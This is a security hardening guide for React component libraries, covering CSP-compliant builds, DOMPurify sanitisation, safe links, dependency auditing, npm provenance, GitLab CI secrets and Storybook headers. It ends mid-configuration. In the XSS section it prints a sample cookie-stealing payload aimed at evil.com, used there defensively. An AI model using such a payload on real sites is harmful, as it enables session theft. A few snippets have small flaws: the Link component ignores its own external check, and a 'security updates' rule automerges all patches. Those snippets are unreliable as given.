# Security Hardening Guide for React 19 UI Component Libraries

**Your React 19 component library built with Vanilla Extract and Vite can achieve enterprise-grade security** through proper configuration, safe coding patterns, and robust supply chain management. This third guide in the series transforms your production-ready library into a security-hardened package that consuming applications can trust.

Security isn't just about protecting your library-it's about ensuring that every application using your components remains secure. A compromised or poorly configured component library forces downstream applications to weaken their security policies, creating vulnerabilities across entire ecosystems. This guide shows you how to build components that work seamlessly with the strictest security policies while protecting against XSS attacks, supply chain compromises, and deployment vulnerabilities.

The practices in this guide reflect late 2024 and early 2025 standards, incorporating the latest developments in npm provenance, Content Security Policy best practices for React 19, modern dependency auditing tools, and secure CI/CD patterns for GitLab. You'll learn not just what to do, but why each practice matters and how it protects both your library and its consumers.

## Engineering for strict Content Security Policy compliance

Content Security Policy (CSP) stands as one of the web's most powerful defenses against code injection attacks. When properly implemented, CSP prevents attackers from executing malicious scripts, loading unauthorized resources, or exfiltrating sensitive data. However, **UI component libraries often become the weakest link**, forcing consuming applications to add dangerous 'unsafe-inline' directives that effectively disable CSP's primary protections. Your library must never force this compromise.

### The critical CSS-in-JS conflict with strict security policies

Traditional runtime CSS-in-JS libraries create an inherent security conflict. Libraries like styled-components and Emotion work by dynamically injecting styles at runtime-creating `<style>` tags in the document head, manipulating the CSSOM directly, or setting inline style attributes. While convenient for developers, this approach violates strict CSP policies that specify `style-src 'self'`, which only permits styles from external stylesheet files loaded from the same origin.

**The security risk of 'unsafe-inline' is severe.** When applications add `style-src 'unsafe-inline'` to accommodate runtime CSS injection, they open the door to CSS-based attacks. Malicious actors can inject CSS to create convincing phishing overlays, exfiltrate sensitive data through attribute selectors that trigger external requests based on input field values, or use CSS to modify page content in ways that trick users. The OWASP and security community consensus is clear: never use 'unsafe-inline' in production.

### How Vanilla Extract solves the CSP problem completely

Vanilla Extract takes a fundamentally different approach that achieves zero-runtime CSS generation. During your build process, Vanilla Extract evaluates your `.css.ts` files, generates static CSS strings, and extracts them into separate `.css` files. The JavaScript bundle contains only the generated class names-no style information, no injection logic, no runtime overhead. As the Vanilla Extract documentation emphasizes: "All styles generated at build time-just like Sass or LESS. None of the code in these files will be included in your final bundle."

This build-time approach provides three critical security advantages. First, it generates completely static CSS files that load via standard `<link>` tags, fully compatible with `style-src 'self'`. Second, it eliminates all runtime style injection mechanisms, ensuring no code in your library will dynamically create style elements or set inline styles. Third, it produces predictable, auditable CSS output that security teams can review and verify.

### Configuring Vite for guaranteed static CSS extraction

Your Vite configuration must be precisely tuned to ensure complete static CSS extraction in production builds. Start by installing the Vanilla Extract plugin:

```bash
npm install --save-dev @vanilla-extract/vite-plugin
```

Then configure your `vite.config.ts` with these critical settings:

```typescript
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { vanillaExtractPlugin } from '@vanilla-extract/vite-plugin';
import { resolve } from 'path';

export default defineConfig({
  plugins: [
    react(),
    vanillaExtractPlugin({
      identifiers: ({ hash }) => `lib_${hash}`
    })
  ],
  
  build: {
    lib: {
      entry: resolve(__dirname, 'src/index.ts'),
      name: 'MyUILibrary',
      formats: ['es', 'cjs'],
      fileName: (format) => `index.${format}.js`
    },
    
    rollupOptions: {
      external: ['react', 'react-dom', 'react/jsx-runtime'],
      output: {
        globals: {
          react: 'React',
          'react-dom': 'ReactDOM'
        },
        assetFileNames: (assetInfo) => {
          if (assetInfo.name?.endsWith('.css')) {
            return 'styles.css';
          }
          return 'assets/[name]-[hash][extname]';
        }
      }
    },
    
    // CRITICAL CSP SETTINGS
    cssCodeSplit: false,        // Single CSS file for library
    assetsInlineLimit: 0,        // Never inline assets as data URIs
    minify: true,
    sourcemap: true
  }
});
```

The most critical setting is `assetsInlineLimit: 0`. By default, Vite inlines small assets as data URIs for performance. While useful for applications, this creates CSP complications because data URIs require `style-src 'data:'` or `img-src 'data:'` directives. Setting this to zero ensures all assets remain as separate files. The `cssCodeSplit: false` setting ensures your library exports a single CSS file rather than code-splitting styles, simplifying consumption and reducing the number of CSP entries needed.

### Verifying CSP compliance in your builds

Verification is essential. You cannot assume your configuration works without testing. Build your library and inspect the output directory:

```bash
npm run build
ls -la dist/
```

You should see a structure like this:

```
dist/
├── index.es.js
├── index.cjs.js
├── styles.css
└── index.d.ts
```

**Critical verification:** Open your JavaScript bundles and search for any style-related code. You should find only class name strings, never CSS properties or injection logic. If you see style objects or CSS strings in the JavaScript, your configuration needs adjustment.

Test with a strict CSP in a consuming application. Create a test app that imports your library and configure the CSP headers:

```typescript
// In consuming app's vite.config.ts
export default defineConfig({
  server: {
    headers: {
      'Content-Security-Policy': 
        "default-src 'self'; " +
        "style-src 'self'; " +
        "script-src 'self'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self'"
    }
  }
});
```

Run the test application and open browser DevTools. The Console should show zero CSP violations. The Network tab should show your `styles.css` loading with `Content-Type: text/css`. The Elements inspector should reveal no inline `style` attributes on component DOM nodes and no dynamically injected `<style>` tags. If any violations appear, investigate immediately-your library is not CSP-compliant.

### Script source considerations and React 19 compatibility

React 19 production builds from Vite are inherently CSP-compliant for scripts. Vite generates standard ES modules or CommonJS files loaded via external `<script>` tags, containing no eval statements or inline script execution. React 19's new features-including Server Actions, enhanced metadata handling, and improved hydration-maintain this CSP compatibility. Your library works perfectly with strict `script-src 'self'` policies without modification.

Nonce-based CSP is rarely needed for component libraries using Vanilla Extract. Nonces solve the problem of safely allowing specific inline scripts by adding a cryptographically random token to both the CSP header and the script tag. However, since Vanilla Extract generates no inline styles and Vite generates no inline scripts, nonces are unnecessary. Only consider implementing nonce support if you have truly unavoidable inline requirements, which is extraordinarily rare in modern React applications.

### Documentation for library consumers

Your library's README must clearly communicate its CSP compatibility. Consumers need to understand that your library requires no special CSP considerations. Document the minimum CSP directives:

```markdown
## Content Security Policy

This library is fully compatible with strict Content Security Policy configurations
and requires no special CSP directives. All styles are extracted at build time into
static CSS files.

### Minimum CSP Requirements

```http
Content-Security-Policy:
  default-src 'self';
  style-src 'self';
  script-src 'self';
  img-src 'self' data: https:;
  font-src 'self';
```

No 'unsafe-inline' or 'unsafe-eval' directives are required. The library includes:
- Static CSS extracted at build time (styles.css)
- Standard JavaScript modules with no eval or inline execution
- No runtime style injection or DOM manipulation outside React's virtual DOM
```

Emphasize what makes your library different from alternatives that require CSP compromises. This becomes a competitive advantage-security-conscious organizations actively seek libraries that maintain CSP compliance.

## Preventing common vulnerabilities in component design

Security vulnerabilities in component libraries rarely come from sophisticated attacks. More often, they emerge from everyday coding patterns used incorrectly. Understanding these patterns and implementing safe alternatives protects every application using your components.

### Cross-site scripting through dangerous HTML rendering

React's default behavior escapes all strings rendered in JSX, automatically converting characters like `<`, `>`, and `&` into their HTML entity equivalents. This automatic escaping prevents XSS attacks in the vast majority of cases. When you write `<div>{userInput}</div>`, even if `userInput` contains `<script>alert('XSS')</script>`, React renders it as harmless text rather than executable code.

The danger emerges when developers need to render legitimate HTML markup from strings. Content management systems, markdown processors, and rich text editors all produce HTML strings that must be rendered with their tags intact. React provides `dangerouslySetInnerHTML` for this purpose, but the name itself warns you: this is dangerous by design. When you use this prop, you completely bypass React's automatic escaping and inject raw HTML directly into the DOM.

Consider this vulnerable component that accepts a biography containing HTML formatting:

```typescript
// ❌ DANGEROUS - XSS VULNERABILITY
interface ProfileProps {
  name: string;
  bio: string;  // May contain HTML like <p>, <em>, etc.
}

export const Profile: React.FC<ProfileProps> = ({ name, bio }) => {
  return (
    <div>
      <h1>{name}</h1>
      <div dangerouslySetInnerHTML={{ __html: bio }} />
    </div>
  );
};
```

If an attacker can control the bio content, they can inject arbitrary JavaScript. A malicious bio value of `<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">` would execute immediately, potentially stealing session cookies or performing actions on behalf of the user. The automatic escaping protection is completely disabled within `dangerouslySetInnerHTML`.

### Sanitization with DOMPurify for safe HTML rendering

DOMPurify provides the industry-standard solution for rendering HTML safely. This library, developed by a team of XSS security experts, parses HTML into a syntax tree and strips out all potentially dangerous elements, attributes, and scripts while preserving benign formatting. Crucially, DOMPurify maintains an allowlist approach-it knows what's safe and removes everything else, making it resilient against novel attack vectors.

Install DOMPurify and its TypeScript types:

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

Create a safe wrapper component that encapsulates the sanitization pattern:

```typescript
// src/components/SafeHtml.tsx
import React from 'react';
import DOMPurify from 'dompurify';

interface SafeHtmlProps {
  html: string;
  className?: string;
  allowedTags?: string[];
  allowedAttributes?: string[];
}

/**
 * Safely renders HTML strings by sanitizing them with DOMPurify.
 * Prevents XSS attacks while allowing safe HTML formatting.
 * 
 * @example
 * <SafeHtml html="<p>Safe <em>formatted</em> content</p>" />
 */
export const SafeHtml: React.FC<SafeHtmlProps> = ({ 
  html, 
  className,
  allowedTags,
  allowedAttributes 
}) => {
  const sanitizedHtml = React.useMemo(() => {
    const config: DOMPurify.Config = {};
    
    if (allowedTags) {
      config.ALLOWED_TAGS = allowedTags;
    }
    
    if (allowedAttributes) {
      config.ALLOWED_ATTR = allowedAttributes;
    }
    
    return DOMPurify.sanitize(html, config);
  }, [html, allowedTags, allowedAttributes]);

  return (
    <div 
      className={className}
      dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
    />
  );
};
```

This component provides several security advantages. The sanitization happens within the component, ensuring developers cannot accidentally bypass it. Using `useMemo` prevents redundant sanitization on every render, improving performance. The configuration options allow consumers to restrict allowed tags and attributes beyond DOMPurify's defaults when needed.

Now the Profile component can render HTML safely:

```typescript
// ✅ SAFE - XSS PROTECTED
import { SafeHtml } from './SafeHtml';

export const Profile: React.FC<ProfileProps> = ({ name, bio }) => {
  return (
    <div>
      <h1>{name}</h1>
      <SafeHtml 
        html={bio}
        allowedTags={['p', 'em', 'strong', 'a', 'ul', 'ol', 'li']}
      />
    </div>
  );
};
```

Even if bio contains `<script>` tags or malicious event handlers, DOMPurify strips them before rendering. The component remains functional for legitimate HTML while being immune to XSS attacks.

### Establishing clear security rules for your team

Make the security rule explicit in your component library's development guidelines: **Never use dangerouslySetInnerHTML without DOMPurify sanitization.** Document this prominently in your contributing guide:

```markdown
## Security Guidelines

### HTML Rendering

**RULE: Never use `dangerouslySetInnerHTML` with raw unsanitized strings.**

When you need to render HTML content:

1. Use the `SafeHtml` component from `src/components/SafeHtml.tsx`
2. If `SafeHtml` doesn't meet your needs, sanitize with DOMPurify before rendering
3. Document why HTML rendering is necessary in the component's documentation

❌ NEVER do this:
```typescript
<div dangerouslySetInnerHTML={{ __html: userContent }} />
```

✅ ALWAYS do this:
```typescript
<SafeHtml html={userContent} />
```
```

### Preventing tabnabbing attacks through insecure links

Links that open in new tabs using `target="_blank"` create a subtle but serious security vulnerability called tabnabbing. When a link opens a new tab, the new page receives access to the original page through the `window.opener` property. This allows the new page to navigate the original page to a different URL using `window.opener.location = 'https://phishing-site.com'`.

The attack scenario is particularly insidious. A user clicks a link in your component library's documentation or example. The link opens a new tab, but the attacker's site immediately redirects the original tab to a convincing phishing page that looks identical to your site. When the user closes the new tab and returns to what they think is your site, they're actually on the attacker's phishing page and might enter sensitive credentials.

The solution is mandatory `rel="noopener noreferrer"` on all external links. The `noopener` attribute prevents the new page from accessing `window.opener`, completely blocking the attack. The `noreferrer` attribute additionally prevents the browser from sending the Referrer header, which improves privacy and is implied by the HTML specification to include noopener behavior.

Create a safe Link component that enforces these attributes:

```typescript
// src/components/Link.tsx
import React from 'react';

interface LinkProps extends React.AnchorHTMLAttributes<HTMLAnchorElement> {
  href: string;
  children: React.ReactNode;
  external?: boolean;
}

/**
 * Safe link component that automatically adds security attributes
 * for external links opened in new tabs.
 * 
 * @example
 * <Link href="https://external.com" external>External Link</Link>
 */
export const Link: React.FC<LinkProps> = ({ 
  href, 
  children, 
  external = false,
  target,
  rel,
  ...props 
}) => {
  // Determine if this is an external link if not explicitly specified
  const isExternal = external || (
    href.startsWith('http://') || 
    href.startsWith('https://') ||
    href.startsWith('//')
  );
  
  // If opening in new tab, enforce security attributes
  const shouldAddSecurity = target === '_blank';
  const secureRel = shouldAddSecurity 
    ? 'noopener noreferrer' 
    : rel;

  return (
    <a 
      href={href}
      target={target}
      rel={secureRel}
      {...props}
    >
      {children}
    </a>
  );
};
```

This component automatically detects external URLs and ensures proper security attributes when `target="_blank"` is used. It respects any explicitly provided `rel` value but overrides it for security when necessary.

### Enforcing security patterns with ESLint

Automated enforcement prevents security vulnerabilities from entering your codebase. ESLint provides rules specifically designed to catch dangerous patterns. Configure your `.eslintrc.js` to enforce secure link practices:

```javascript
module.exports = {
  extends: [
    'eslint:recommended',
    'plugin:react/recommended',
    'plugin:react-hooks/recommended',
    'plugin:@typescript-eslint/recommended'
  ],
  plugins: ['react', '@typescript-eslint'],
  rules: {
    // Security rules
    'react/jsx-no-target-blank': ['error', {
      allowReferrer: false,      // Require both noopener and noreferrer
      enforceDynamicLinks: 'always',  // Check dynamic hrefs too
      warnOnSpreadAttributes: true
    }],
    'react/no-danger': 'warn',   // Warn on dangerouslySetInnerHTML usage
    'react/no-danger-with-children': 'error',  // Children and __html together is always wrong
  }
};
```

The `react/jsx-no-target-blank` rule automatically catches links missing security attributes and prevents pull requests from merging until they're fixed. The `react/no-danger` rule warns whenever developers use `dangerouslySetInnerHTML`, prompting them to consider whether it's truly necessary and to use proper sanitization.

For stricter enforcement, consider the eslint-plugin-risxss plugin, which specifically checks that `dangerouslySetInnerHTML` is always accompanied by sanitization:

```bash
npm install --save-dev eslint-plugin-risxss
```

```javascript
// .eslintrc.js
module.exports = {
  plugins: ['risxss'],
  rules: {
    'risxss/catch-potential-xss-react': 'error'
  }
};
```

This plugin recognizes DOMPurify.sanitize calls and only allows `dangerouslySetInnerHTML` when the content has been sanitized, providing foolproof protection against accidental XSS vulnerabilities.

## Hardening the software supply chain

Your component library depends on dozens or hundreds of packages, each representing a potential security vulnerability. Supply chain attacks have become increasingly sophisticated, with attackers compromising legitimate packages, typosquatting popular package names, and hiding malicious code in dependency updates. A comprehensive supply chain security strategy protects your library and its consumers.

### Dependency auditing with npm audit and modern alternatives

The npm audit command provides basic vulnerability scanning by checking your dependencies against the npm Advisory Database. However, npm audit has significant limitations that make it insufficient as a sole security tool. It produces frequent false positives for vulnerabilities in development dependencies that never reach production code. It lacks built-in allowlisting for known issues, making it difficult to use as a blocking CI check. It treats all vulnerabilities equally without considering whether the vulnerable code path is actually reachable in your usage.

Use npm audit strategically by focusing on production dependencies with appropriate severity thresholds:

```bash
# Production dependencies only, high severity and above
npm audit --omit=dev --audit-level=high

# For CI/CD, use moderate threshold as a reasonable balance
npm audit --audit-level=moderate --production
```

**Audit-ci** provides essential features missing from npm audit. This IBM-developed tool wraps npm audit with allowlisting support, making it practical for CI/CD pipelines. Install and configure it:

```bash
npm install --save-dev audit-ci
```

Create an `audit-ci.jsonc` configuration file in your project root:

```json
{
  "$schema": "https://github.com/IBM/audit-ci/raw/main/docs/schema.json",
  "moderate": true,
  "allowlist": [
    "GHSA-pw2r-vq6v-hr8c"
  ],
  "path-allowlist": {
    "GHSA-74fj-2j2h-c42q": [
      "dev-dependency>transitive-dep"
    ]
  }
}
```

The allowlist contains advisory IDs for vulnerabilities you've assessed and determined to be non-exploitable in your context. The path-allowlist restricts ignoring to specific dependency paths, preventing you from accidentally ignoring a vulnerability if it appears through a different package. Always include comments explaining why each advisory is allowlisted and set expiration dates for review.

**Socket.dev** represents the next generation of supply chain security. Rather than just scanning for known vulnerabilities, Socket analyzes package behavior to detect suspicious patterns. It flags install scripts that execute code during npm install, obfuscated code that might hide malicious behavior, network access to unexpected domains, filesystem operations, and even uses AI to detect potential malware. Socket integrates as a GitHub app that comments on pull requests or as a CLI wrapper:

```bash
npm install -g socket
socket npm install package-name
```

For CI integration, add Socket to your pipeline:

```bash
# In CI script
socket ci
```

Socket's proactive approach catches supply chain attacks that npm audit misses entirely, particularly new packages with hidden malicious behavior that haven't yet been reported as vulnerabilities.

### Integrating security audits into your GitLab CI pipeline

Make security audits mandatory by integrating them as blocking CI checks. Your `.gitlab-ci.yml` should include a dedicated security stage:

```yaml
stages:
  - install
  - test
  - security
  - build
  - publish

variables:
  NODE_VERSION: "20"

# Cache dependencies for faster builds
.cache_config: &cache_config
  cache:
    key: ${CI_COMMIT_REF_SLUG}
    paths:
      - node_modules/
      - .npm/

install:
  image: node:${NODE_VERSION}
  stage: install
  script:
    - npm ci --cache .npm --prefer-offline
  <<: *cache_config
  artifacts:
    paths:
      - node_modules/
    expire_in: 1 hour

# Security audit with audit-ci
security:audit:
  image: node:${NODE_VERSION}
  stage: security
  dependencies:
    - install
  script:
    - npx audit-ci --config audit-ci.jsonc
  allow_failure: false  # Block pipeline on security issues
  only:
    - merge_requests
    - main

# Alternative: Socket.dev scan
security:socket:
  image: node:${NODE_VERSION}
  stage: security
  dependencies:
    - install
  script:
    - npm install -g socket
    - socket ci
  allow_failure: false
  only:
    - merge_requests
    - main
```

Setting `allow_failure: false` ensures that security vulnerabilities block the pipeline. Pull requests cannot merge until vulnerabilities are resolved or explicitly allowlisted with documented justification. This creates a security gate that prevents vulnerable code from reaching production.

### Automated dependency updates with Renovate Bot

Keeping dependencies updated is critical for security, but manual updates are time-consuming and often neglected. Renovate Bot automates this process while giving you fine-grained control over update policies. For component libraries, Renovate offers significant advantages over GitHub's Dependabot, particularly around grouped updates, monorepo support, and sophisticated scheduling.

Configure Renovate by creating a `renovate.json` file in your repository root:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:base",
    "group:monorepos",
    "schedule:weekends"
  ],
  
  "npm": {
    "minimumReleaseAge": "3 days",
    "rangeStrategy": "pin"
  },
  
  "packageRules": [
    {
      "description": "Group all non-major updates together",
      "matchUpdateTypes": ["minor", "patch"],
      "groupName": "all non-major dependencies",
      "groupSlug": "all-minor-patch"
    },
    {
      "description": "Automerge dev dependency patches",
      "matchDepTypes": ["devDependencies"],
      "matchUpdateTypes": ["patch"],
      "automerge": true
    },
    {
      "description": "Security updates get immediate attention",
      "matchDatasources": ["npm"],
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "schedule": ["at any time"]
    },
    {
      "description": "Peer dependencies need careful review",
      "matchDepTypes": ["peerDependencies"],
      "automerge": false,
      "dependencyDashboardApproval": true,
      "labels": ["peer-deps", "needs-review"]
    },
    {
      "description": "React ecosystem updates grouped",
      "matchPackagePatterns": ["^react", "^@types/react"],
      "groupName": "React ecosystem",
      "schedule": ["every 2 weeks"]
    },
    {
      "description": "Major updates require approval",
      "matchUpdateTypes": ["major"],
      "dependencyDashboardApproval": true
    }
  ],
  
  "vulnerabilityAlerts": {
    "labels": ["security"],
    "assignees": ["@security-team"],
    "schedule": ["at any time"]
  }
}
```

This configuration implements a security-focused update strategy. Non-major updates are grouped weekly to reduce PR noise while ensuring regular updates. Security patches automerge immediately regardless of schedule. Major updates require explicit approval through Renovate's dependency dashboard, preventing breaking changes from merging automatically. Peer dependencies require manual review because they affect consuming applications' compatibility.

The `minimumReleaseAge` setting adds a three-day waiting period before adopting new versions, allowing the community to discover critical bugs before they reach your codebase. For package managers publishing multiple version updates rapidly, this prevents adopting immediately-reverted buggy releases.

### Secure NPM publishing with provenance and 2FA

Publishing packages to npm represents a critical security boundary. Compromised publishing credentials allow attackers to inject malicious code that reaches thousands or millions of users. Modern npm security features provide multiple layers of protection.

**NPM provenance** creates a cryptographic link between your published package and its source repository. Introduced in 2023 and built on the SLSA framework and Sigstore infrastructure, provenance generates signed attestations proving which repository, commit, and CI workflow produced the package. This prevents attackers from publishing malicious versions even if they steal your npm tokens, because they cannot forge the cryptographic signatures linking to your verified repository.

Enable provenance through **Trusted Publishing**, which eliminates long-lived npm tokens entirely. Configure Trusted Publishing in your npm package settings by connecting your GitLab repository. Then update your `.gitlab-ci.yml`:

```yaml
publish:
  stage: publish
  image: node:20
  
  # Enable OIDC token generation
  id_tokens:
    SIGSTORE_ID_TOKEN:
      aud: sigstore
  
  script:
    - npm install -g npm@latest  # Ensure npm 9.5.0+
    - npm ci
    - npm run build
    - npm publish --provenance --access public
  
  rules:
    - if: '$CI_COMMIT_TAG =~ /^v[0-9]+\.[0-9]+\.[0-9]+$/'
  
  environment:
    name: production
```

The `id_tokens` section generates short-lived OIDC tokens that npm uses to verify your identity. The `--provenance` flag generates and publishes the attestation. Notice there's no `NPM_TOKEN` environment variable-Trusted Publishing authenticates through GitLab's OIDC provider instead of static tokens. This eliminates the risk of token leaks and makes compromise significantly harder.

Published packages display a provenance badge on npmjs.com. Consumers can verify provenance using:

```bash
npm audit signatures
```

This command checks that packages have valid signatures and match their claimed source repositories, providing supply chain transparency.

**Two-factor authentication** protects your npm account from credential theft. As of late 2024, npm mandates 2FA for all maintainers of high-impact packages (those with 1 million+ weekly downloads or 500+ dependents). Even if your package doesn't meet these thresholds, enable 2FA immediately. Use the "Authorization and writes" mode, which requires 2FA for both login and publishing actions. Prefer hardware security keys (WebAuthn/FIDO2) over TOTP authenticators when possible, as they provide stronger phishing resistance.

Configure package-level 2FA settings to require 2FA from all maintainers and disallow publishing via automation tokens, forcing the use of Trusted Publishing:

```bash
npm access 2fa-required your-package-name
npm access 2fa-not-required your-package-name --automation
```

### Secure token management with .npmrc configuration

If you must use npm tokens instead of Trusted Publishing, never commit them to version control. Use environment variables and properly configured `.npmrc` files. Your project's `.npmrc` should contain only non-sensitive configuration:

```
# .npmrc - Safe to commit
registry=https://registry.npmjs.org/
strict-ssl=true
save-exact=true
package-lock=true
```

Authentication tokens belong in CI/CD variables, not in files. In GitLab, go to Settings > CI/CD > Variables and add `NPM_TOKEN` as a **protected, masked, and hidden** variable. Protected variables are only available to protected branches and tags. Masked variables are filtered from job logs. Hidden variables (available in GitLab 17.4+) are additionally hidden from the UI. Set the environment scope to "production" to restrict the token to production deployments.

In your CI script, inject the token into `.npmrc` at runtime:

```yaml
publish:
  script:
    - echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc
    - npm publish --provenance
```

This approach ensures tokens never appear in your repository while remaining accessible to authorized CI jobs. The `.npmrc` file created during the job is ephemeral and destroyed when the CI container terminates.

## Secure CI/CD and publishing practices

Your CI/CD pipeline represents the automated bridge between source code and published packages. Any weakness in this pipeline compromises your entire supply chain security. Modern CI/CD security focuses on secrets management, build integrity, and provenance generation.

### GitLab CI/CD variable security

GitLab provides three types of variable protection: protected, masked, and masked with hidden. Understanding their differences is critical. **Protected variables** are only available to pipelines running on protected branches or tags, preventing development branches from accessing production secrets. **Masked variables** are filtered from job logs using pattern matching, but can be leaked through encoding or string manipulation. **Masked and hidden variables** (GitLab 17.4+) add UI hiding on top of log masking, providing the strongest protection.

Use protected and masked and hidden variables for critical secrets like `NPM_TOKEN`. Configure them in Settings > CI/CD > Variables with these settings:

- **Key**: NPM_TOKEN
- **Value**: Your npm automation token or leave empty if using Trusted Publishing
- **Type**: Variable
- **Protect variable**: ✓ (limits to protected branches/tags)
- **Visibility**: Masked and hidden
- **Environment scope**: production

This configuration ensures your npm token is only accessible when publishing from tagged releases on protected branches, never from feature branches or external contributions.

**Critical security warning**: Masked variables are not foolproof. Attackers with write access to CI configuration files can extract masked variables by encoding them (base64, hex) or splitting them character by character. For maximum security, use Trusted Publishing instead of long-lived tokens, as it eliminates this attack vector entirely.

### NPM provenance in GitLab CI pipelines

Integrating npm provenance into GitLab CI requires npm 9.5.0+, GitLab 16.2+, and cloud-hosted runners. The workflow uses GitLab's OIDC provider to generate short-lived cryptographic tokens that npm verifies and includes in the provenance attestation.

Complete secure publishing pipeline:

```yaml
variables:
  NODE_VERSION: "20"

stages:
  - test
  - build
  - publish

# Use pinned SHA digests for security
.node_base:
  image: node@sha256:742ba45ee5e863bf6133c6dc0eccb53bdd6f5eeecdb480314e46d6e098e0ef81

test:
  extends: .node_base
  stage: test
  script:
    - npm ci
    - npm run lint
    - npm run test
    - npm audit --audit-level=high --production
  coverage: '/All files[^|]*\|[^|]*\s+([\d\.]+)/'

build:
  extends: .node_base
  stage: build
  script:
    - npm ci
    - npm run build
  artifacts:
    paths:
      - dist/
    expire_in: 1 hour
  only:
    - tags

publish:
  extends: .node_base
  stage: publish
  dependencies:
    - build
  
  # CRITICAL: Enable OIDC token generation
  id_tokens:
    SIGSTORE_ID_TOKEN:
      aud: sigstore
  
  script:
    - npm install -g npm@latest
    - npm pack --dry-run  # Verify package contents
    - npm publish --provenance --access public
  
  rules:
    - if: '$CI_COMMIT_TAG =~ /^v[0-9]+\.[0-9]+\.[0-9]+$/'
  
  environment:
    name: production
    url: https://www.npmjs.com/package/$CI_PROJECT_NAME
```

The `id_tokens` section with `aud: sigstore` is critical-it must match exactly. GitLab generates a JWT token that npm validates against Sigstore's Fulcio certificate authority. The attestation is published to Rekor, Sigstore's transparency log, where anyone can verify it.

The `npm pack --dry-run` command previews package contents before publishing, helping you catch files accidentally included through incomplete `.npmignore` configuration. The `rules` section ensures publishing only occurs for properly formatted semantic version tags, preventing accidental publishes from development work.

### Protected branches and tags

CI/CD security requires protecting your release branches and tags. In GitLab, go to Settings > Repository > Protected Branches and configure:

- **main**: Protect, allow merge only for Maintainers
- Require approval from code owners
- Require passed pipeline before merge

Then protect tags in Settings > Repository > Protected Tags:

- **v***: Protect, allow creation only for Maintainers

These settings ensure only authorized maintainers can trigger production releases, and all code goes through review and testing before publication. Combined with protected CI/CD variables, this creates multiple security layers that must all be compromised for an attacker to publish malicious code.

## Securing deployed Storybook environments

Your Storybook deployment serves as public documentation and component showcase. While it contains no sensitive data or user information, it still requires security headers to protect visitors and demonstrate security best practices to potential library users.

### Understanding security headers for static sites

Security headers are HTTP response headers that instruct browsers to enable protective features. The OWASP Secure Headers Project maintains the definitive list of recommended headers. As of late 2024, the recommended security header configuration has evolved-notably, **X-XSS-Protection should now be set to 0** rather than 1, as the protection mechanism has known bypasses that can be exploited.

Complete security header configuration for Storybook:

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
X-XSS-Protection: 0
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

**Strict-Transport-Security** forces browsers to access your site exclusively over HTTPS, preventing downgrade attacks. The 63072000 seconds (2 years) duration with includeSubDomains ensures comprehensive HTTPS enforcement. **X-Frame-Options: DENY** prevents your site from being embedded in iframes, blocking clickjacking attacks. **X-Content-Type-Options: nosniff** prevents browsers from MIME-sniffing responses away from declared content types, stopping execution of incorrectly typed responses. **Referrer-Policy** controls what information is sent in the Referer header, balancing analytics with privacy.

### Content Security Policy for Storybook

Storybook requires less strict CSP than production applications due to its development-focused architecture. Storybook uses dynamic script evaluation for hot module replacement and inline styles for component rendering in its interface. Attempting to enforce strict CSP on Storybook breaks functionality.

The recommended CSP for Storybook balances security with functionality:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none'
```

This configuration requires `'unsafe-inline'` for both scripts and styles, and `'unsafe-eval'` for script execution. While these directives weaken CSP protection, they're necessary for Storybook to function. Document this tradeoff clearly: "This Storybook deployment uses relaxed CSP directives required by Storybook's architecture. These settings are appropriate for public component documentation but should not be used for production applications handling user data or requiring authentication."

### Configuring security headers on different hosting platforms

GitLab Pages, the default deployment target for GitLab-hosted projects, does not support custom headers natively. This limitation forces you to either proxy through a reverse proxy or use alternative hosting. For production component library documentation, alternative hosting is preferable.

**Netlify** provides the most straightforward header configuration. Create a `netlify.toml` file:

```toml
[build]
  command = "npm run build-storybook"
  publish = "storybook-static"

[[headers]]
  for = "/*"
  [headers.values]
    Strict-Transport-Security = "max-age=63072000; includeSubDomains; preload"
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
    X-XSS-Protection = "0"
    Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'"

[[headers]]
  for = "/*.js"
  [headers.values]
    Cache-Control = "public, max-age=31536000, immutable"

[[headers]]
  for = "/*.css"
  [headers.values]
    Cache-Control = "public, max-age=31536000, immutable"
```

Alternatively, create a `_headers` file in your `storybook-static` directory:

```
/*
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=()
  X-XSS-Protection: 0
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:
```

Integrate header file generation into your CI pipeline:

```yaml
build-storybook:
  stage: build
  image: node:20
  script:
    - npm ci
    - npm run build-storybook
    # Generate security headers file
    - |
      cat > storybook-static/_headers << 'EOF'
      /*
        Strict-Transport-Security: max-age=63072000; includeSubDomains
        X-Frame-Options: DENY
        X-Content-Type-Options: nosniff
        Referrer-Policy: strict-origin-when-cross-origin
        Permissions-Policy: geolocation=(), microphone=(), camera=()
        X-XSS-Protection: 0
